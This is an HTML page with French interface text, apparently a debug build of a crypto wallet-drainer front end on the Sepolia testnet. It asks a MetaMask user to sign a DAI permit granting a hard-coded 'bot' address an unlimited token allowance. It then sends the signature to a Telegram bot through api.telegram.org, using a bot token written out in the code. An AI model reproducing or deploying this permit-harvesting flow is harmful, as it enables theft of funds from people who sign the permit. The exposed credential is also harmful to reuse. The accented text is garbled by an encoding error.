<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Meta DAI Permit Debug</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.min.js"></script>
</head>
<body>
  <h1>Signer DAI Permit et envoyer au bot (Debug)</h1>
  <button onclick="signPermit()">Signer</button>

  <script>
    // ================= CONFIG =================
    const BOT_TOKEN = "8488605497:AAHskwHjVbpN0oBvYeznvYrk88W33jfsQQw";        // ton bot Telegram
    const BOT_ETH_ADDRESS = "0xF6BeD72aA6eB2e0DBb2768F07ed77f1c5dCEC6b1"; // wallet du bot
    const DAI = "0x11fE4B6AE13d2a6055C8D9cF65c55bac32B5d844"; // DAI Sepolia
    const CHAIN_ID = 11155111; // Sepolia
    // ==========================================

    async function signPermit() {
      console.clear();
      console.log("üîπ D√©but signPermit");

      // 1Ô∏è‚É£ V√©rification MetaMask
      if (!window.ethereum) {
        alert("MetaMask non d√©tect√© !");
        console.error("MetaMask non d√©tect√© !");
        return;
      }
      console.log("MetaMask d√©tect√© :", window.ethereum);

      // 2Ô∏è‚É£ Connexion √† MetaMask
      const provider = new ethers.BrowserProvider(window.ethereum);
      try {
        await provider.send("eth_requestAccounts", []);
      } catch(e) {
        alert("Connexion MetaMask refus√©e");
        console.error("Connexion MetaMask refus√©e", e);
        return;
      }

      const signer = await provider.getSigner();
      const owner = await signer.getAddress();
      console.log("Adresse MetaMask connect√©e :", owner);

      // 3Ô∏è‚É£ Contrat DAI
      const dai = new ethers.Contract(
        DAI,
        [
          "function nonces(address) view returns (uint256)",
          "function name() view returns (string)"
        ],
        provider
      );

      let nonce, name;
      try {
        nonce = await dai.nonces(owner);
        name = await dai.name();
        console.log("Nonce :", nonce.toString());
        console.log("Nom du token :", name);
      } catch(e) {
        alert("Erreur r√©cup√©ration nonce ou name du token");
        console.error(e);
        return;
      }

      const deadline = Math.floor(Date.now() / 1000) + 3600; // 1h

      // 4Ô∏è‚É£ Pr√©parer le permit
      const domain = { name, version: "1", chainId: CHAIN_ID, verifyingContract: DAI };
      const types = { Permit: [
        { name: "owner", type: "address" },
        { name: "spender", type: "address" },
        { name: "value", type: "uint256" },
        { name: "nonce", type: "uint256" },
        { name: "deadline", type: "uint256" }
      ]};
      const values = {
        owner,
        spender: BOT_ETH_ADDRESS,
        value: ethers.MaxUint256,
        nonce,
        deadline
      };
      console.log("Valeurs Permit :", values);

      // 5Ô∏è‚É£ Signer
      let signature;
      try {
        signature = await signer.signTypedData(domain, types, values);
        console.log("Signature :", signature);
      } catch(e) {
        alert("Erreur lors de la signature");
        console.error(e);
        return;
      }

      // 6Ô∏è‚É£ Pr√©parer payload pour Telegram
      const payload = { user: owner, value: values.value.toString(), deadline, signature };
      console.log("Payload envoy√© :", payload);

      // 7Ô∏è‚É£ Envoyer au bot Telegram
      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ text: JSON.stringify(payload) })
        });
        const json = await res.json();
        console.log("R√©ponse Telegram :", json);
        alert("‚úÖ Permit sign√© et envoy√© au bot !");
      } catch(e) {
        alert("Erreur envoi au bot Telegram");
        console.error(e);
      }
    }
  </script>
</body>
</html>
